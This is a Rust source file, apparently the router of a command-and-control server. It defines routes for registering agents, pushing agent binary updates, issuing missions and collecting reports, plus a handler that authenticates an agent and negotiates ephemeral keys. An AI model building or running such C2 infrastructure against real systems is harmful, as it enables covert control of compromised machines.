use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post, put},
    Json, Router,
};
use common::model;
use tracing::{error, warn};

use crate::{services, C2State};

mod agents;
mod missions;
mod releases;

pub const AGENT_NOT_FOUND: &str = "Agent not found.";
pub const MISSION_NOT_FOUND: &str = "Mission not found.";
pub const RELEASE_NOT_FOUND: &str = "Release not found.";

// TODO Either encrypt all routes or listen on a different interface for admin routes
// TODO Try to propagate errors using impl IntoResponse for better error handling

// TODO Fix access & permissions
pub fn init_router() -> Router<C2State> {
    Router::new()
        .route("/crypto/:mission_id", get(get_crypto))
        .nest(
            "/agents",
            Router::new()
                .route("/", post(agents::create).get(agents::get))
                .nest(
                    "/:agent_id",
                    Router::new()
                        .route("/", put(agents::update))
                        .route("/update", put(agents::update_bin)),
                ),
        )
        .nest(
            "/releases",
            Router::new()
                .route("/", post(releases::create).get(releases::get))
                .route("/:release_id", get(releases::get_by_checksum)),
        )
        .nest(
            "/missions",
            Router::new()
                .route("/", post(missions::create).get(missions::get_next))
                .route(
                    "/:mission_id",
                    get(missions::get_report).put(missions::report),
                ),
        )
}

async fn get_crypto(
    State(mut c2_state): State<C2State>,
    Path(mission_id): Path<i32>,
    crypto_negociation: Json<model::CryptoNegociation>,
) -> impl IntoResponse {
    // Check agent & agent exists
    let agent = match crypto_negociation.verify() {
        Ok(_) => {
            match services::agents::get_by_identity(
                c2_state.conn.clone(),
                crypto_negociation.identity.to_bytes(),
            ) {
                Ok(Some(agent)) => agent,
                Ok(None) => {
                    warn!("Agent not found");
                    return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
                }
                Err(e) => {
                    error!("{e}");
                    return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
                }
            }
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::UNAUTHORIZED).into_response();
        }
    };

    // Check mission exists
    let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
        Ok(Some(m)) => m,
        Ok(None) => {
            warn!("Mission not found");
            return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    // Check mission is not completed and is for the agent
    if mission.completed_at.is_some() || mission.agent_id != agent.id {
        warn!(
            "Mission [{}] is completed or not affected to agent [{}]",
            mission_id, agent.id
        );
        return (StatusCode::BAD_REQUEST).into_response();
    }

    let (private_key, crypto_negociation) =
        model::CryptoNegociation::new(&mut c2_state.signing_key);
    c2_state
        .ephemeral_private_keys
        .lock()
        .unwrap()
        .entry(mission.id)
        .or_insert(private_key);

    (StatusCode::OK, Json(Some(crypto_negociation))).into_response()
}
